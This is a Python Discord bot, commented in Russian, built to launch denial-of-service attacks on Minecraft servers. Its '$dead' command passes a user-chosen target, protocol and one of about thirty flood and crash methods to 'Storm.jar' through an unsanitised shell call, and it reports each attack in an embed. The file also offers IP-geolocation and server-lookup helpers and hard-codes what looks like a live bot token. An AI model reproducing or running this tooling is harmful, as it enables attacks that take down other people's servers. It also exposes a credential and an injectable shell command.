import json
import subprocess
import urllib

import discord
from discord.ext import commands

TOKEN = "MTIwODMyOTI0NjU1Mjg4MzIxMA.GY47pa.EK1wycI1Op_AgH-4DrpjqxnjoUitbApa4c3wLU"
methods_list = ['join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'spoof', 'ping', 'nullping', 'multikiller', 'handshake', 'bighandshake', 'query', 'bigpacket', 'network', 'randombytes', 'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher', 'tcphit', 'queue', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry']

timebotter = commands.Bot(command_prefix='$', intents=discord.Intents.all())
TARGET_CPS = int(-1)
ATTACK_TIME = int(60)
timebotter.remove_command('help')

@timebotter.event
async def on_ready():
    activity = discord.Streaming(name="$help - MINECRAFT", url="https://open.spotify.com/playlist/7vHEyjVLTJQak9iLnlvtta?uid=45f3cb6cb54946de&uri=spotify%3Atrack%3A3SvVNrAkX1u57uS6BXhiKe") # Статус бота
    await timebotter.change_presence(status=discord.Status.idle, activity=activity)
    print("Готов убивать сервера!") # Вывод сообщения в терминал о том что статус бота был выставлен!

@timebotter.command(name = "help")
async def h(ctx):
    embed = discord.Embed(
        title="**Help**",
        description="""DDos           $dead <ip:port> <protocol/version> <methods>
                       Protocols      $protocols
                       ping           $ping
                       info           $info
                       Ютуб           $ютуб
                       ip             $ip
                       say            $say
                       offline        $offline
                       message_send   $message_send
                       resolve        $resolve
                       Methods        $methods
                       Clear          $clear
                       Kiсk           $kick"""
                     
    )
    embed.set_image(url=f'https://miro.medium.com/v2/resize:fit:1400/1*JY1afR9MoaK-Ih3DnIQ7WA.gif')
    embed.set_footer(text="© 2023 by HELP MINECRAFT")
    await ctx.send(embed=embed)

@timebotter.command()
async def dead(ctx, host, proto, method):
  if method in methods_list:
        embed = discord.Embed(
            title="⚡️ **Успешно Запущена Атака** ⚡️",
            description=f"Атаку запустил {ctx.author.mention}",
            color=discord.Colour.random()
      )
        embed.add_field(name='📡 Server:', value=f'**{host}**', inline=False)
        embed.add_field(name='🔰 Protocol:', value=f'**{proto}**', inline=False)
        embed.add_field(name='🔗 Method:', value=f'**{method}**', inline=False)
        embed.add_field(name='🕜 Time:', value=f'**{ATTACK_TIME}**', inline=False)
        embed.add_field(name='🧬 Cps', value=f'**{TARGET_CPS}**', inline=False)
        embed.add_field(name='🐻 **BOTNET**', value=f'32', inline=False)
        embed.add_field(name='⚡️**ТОП КРАШЕР**', value=f'DDOS', inline=False)
        embed.set_image(url=f'https://media.tenor.com/PMITaIPBRBkAAAAC/hack-pc.gif')
        embed.set_footer(text="© 2023 by DDOS MINECRAFT")
        await ctx.send(embed=embed)
        subprocess.Popen(f'java -jar Storm.jar {host} {proto} {method} {ATTACK_TIME} 3500', shell=True)

@timebotter.command()
async def ping(ctx):
     await ctx.send(f'BOT PING! {round(timebotter.latency * 1000)}ms')

@timebotter.command()
async def info(ctx):
  await ctx.send('exzo')

@timebotter.command()
async def ютуб(ctx):
  await ctx.send('ТУТ МОЖЕТ БЫТЬ ВАША ССЫЛКА!')

@timebotter.command()
async def methods(ctx):
    embed = discord.Embed(
        title="📁 All Methods",
        color=discord.Colour.green()
    )
    embed.add_field(name='Methods:', value=', '.join([i for i in methods_list]), inline=True)
    embed.set_footer(text="все методы указывать с маленькой буквы")
    await ctx.send(embed=embed)

@timebotter.command(pass_context= True)
@commands.has_permissions ( administrator = True)

async def kick (ctx, member: discord.Member, *, reason = None ):
    await ctx.channel.purge( limit= 1 )

    await member.kick( reason = reason )
    await ctx.send(f'Юзер {member.mention} был кикнут✅')

@timebotter.command(name = "protocols")
async def prot(ctx):
    embed = discord.Embed(
        title="**protocols**",
        description="""`
1.18.2 - 758
1.18.1 - 757
1.17.1 - 756
1.17 - 755
1.16.5 - 754
1.16.4 - 754
1.16.3 - 753
1.16.2 - 751
1.16.1 - 736
1.16 - 735
1.15.2 - 578
1.15.1 - 575
1.15 - 573
1.14.4 - 498
1.14.3 - 490
1.14.2 - 485
1.14.1 - 480
1.14 - 477
1.13.2 - 404
1.13.1 - 401
1.13 - 393
1.12.2 - 340
1.12.1 - 338
1.12 - 335
1.11.2 - 316
1.11.1 - 316
1.11 - 315
1.10.2 - 210
1.10.1 - 210
1.10 - 210
1.9.4 - 110
1.9.3 - 110
1.9.2 - 109
1.9.1 - 109
1.9 - 107
1.8.9 - 47
1.8.8 - 47
1.8.7 - 47
1.8.6 - 47
1.8.5 - 47
1.8.4 - 47
1.8.3 - 47
1.8.2 - 47
1.8.1 - 47
1.7.10 - 5
1.7.9 - 5
1.7.8 - 5
1.7.7 - 5
1.7.6 - 5
1.7.5 - 4
1.7.4 - 4
1.7.2 - 4`""",
        color=discord.Color.yellow()
    )
    await ctx.send(embed=embed)

@timebotter.command()
async def ip(ctx, arg1):
    url = "http://ipwhois.app/json/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="IP",
        color=discord.Colour.random() , timestamp= ctx.message.created_at
    )
    embed.add_field(name="IP:", value=json_object["ip"], inline=False)
    embed.add_field(name="Type:", value=json_object["type"], inline=False)
    embed.add_field(name='Continent:', value=json_object["continent"], inline=False)
    embed.add_field(name="Region:", value=json_object["region"], inline=False)
    embed.add_field(name="Country:", value=json_object["country"], inline=False)
    embed.add_field(name="City:", value=json_object["city"], inline=False)
    embed.add_field(name="Latitude:", value=json_object["latitude"], inline=False)
    embed.add_field(name="Longitude:", value=json_object["longitude"], inline=False)
    embed.add_field(name="ISP:", value=json_object["isp"], inline=False)
    embed.add_field(name="Org:", value=json_object["org"], inline=False)
    embed.add_field(name="ASN:", value=json_object["asn"], inline=False)
    embed.add_field(name="Currency:", value=json_object["currency"], inline=False)
    embed.add_field(name="Currency Symbol:", value=json_object["currency_symbol"], inline=False)

    embed.set_footer(text="DDOS")
    embed.set_image(url=f'https://media.giphy.com/media/qgQUggAC3Pfv687qPC/giphy.gif')
    await ctx.send(embed=embed)

@timebotter.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="DDOS",
        color=discord.Colour.red()
    )
    if json_object["online"] == "True":
        status = "Server offline"
        embed.add_field(name='🛰 Айпи:', value=json_object["ip"], inline=True)
        embed.add_field(name="🛩 Порт:", value=json_object["port"], inline=False)
        embed.add_field(name="🌍 Версия:", value=json_object["version"], inline=False)
        embed.add_field(name="✔️ Hostname:", value=json_object["hostname"], inline=True)
        embed.add_field(name="💻 Статус:", value=json_object["online"], inline=False)
        embed.add_field(name="🔗 Протокол:", value=json_object["protocol"], inline=False)
        embed.set_image(url=f'http://status.mclive.eu/{arg1}/{arg1}/banner.png')

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="DDOS")
        await ctx.send(embed=embed)
    else:
        statas = "🎯  𝐒𝐓𝐀𝐓𝐒 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 🎯"
        embed.add_field(name="🎯 **𝐈𝐏**:", value=json_object["ip"], inline=True)
        embed.add_field(name="⚡️ **𝐏𝐎𝐑𝐓**:", value=json_object["port"], inline=True)
        embed.add_field(name="♻️ **𝙑𝙀𝙍𝙎𝙄𝙊𝙉**:", value=json_object["version"], inline=False)
        embed.add_field(name="🖥 **𝙃𝙊𝙎𝙏𝙉𝘼𝙈𝙀**:", value=json_object["hostname"], inline=True)
        embed.add_field(name="🔍 **𝙎𝙏𝘼𝙏𝙐𝙎**:", value=json_object["online"], inline=False)
        embed.add_field(name="🔗 **𝙋𝙍𝙊𝙏𝙊𝘾𝙊𝙇**:", value=json_object["protocol"], inline=False)
        embed.set_image(url=f'http://status.mclive.eu/{arg1}/{arg1}/banner.png')

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="RESOLVE BY exzo bot")
        await ctx.send(embed=embed)
      
@timebotter.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, amount=None):
    await ctx.channel.purge(limit=int(amount))
    await ctx.channel.send('⚙️ Очищено! ⚙️')

@timebotter.command()
async def message_send( ctx ):
    await ctx.author.send( '💡 **Дай деняк?** 💡' )

@timebotter.command()
async def say(ctx, *, question: commands.clean_content):
   if ctx.message.channel.id != timebotter:
    await ctx.send(f'{question}')
    await ctx.message.delete()

@timebotter.command()
async def offline(ctx):

    author = ctx.message.author.name
    if author == "DEAD DOS":
            await timebotter.change_presence(status=discord.Status.offline)
    message = await ctx.send(embed=discord.Embed(description=f' 😎 **Бот перешел в скрытый режим**', colour=discord.Color.random()))

timebotter.run(TOKEN)